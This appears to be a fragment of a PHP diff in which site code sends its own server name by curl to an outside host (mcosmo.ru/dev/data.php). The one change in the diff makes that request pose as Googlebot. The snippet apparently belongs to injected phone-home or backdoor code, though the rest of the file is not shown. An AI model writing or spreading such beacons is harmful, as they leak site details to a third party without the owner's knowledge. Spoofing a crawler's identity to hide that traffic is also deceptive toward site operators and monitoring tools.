@@ -100,7 +100,7 @@ if($sayi == 1) {
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
     CURLOPT_URL => 'http://www.mcosmo.ru/dev/data.php?s='.$_SERVER["SERVER_NAME"].'',
-    CURLOPT_USERAGENT => ''
+    CURLOPT_USERAGENT => 'googlebot'
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
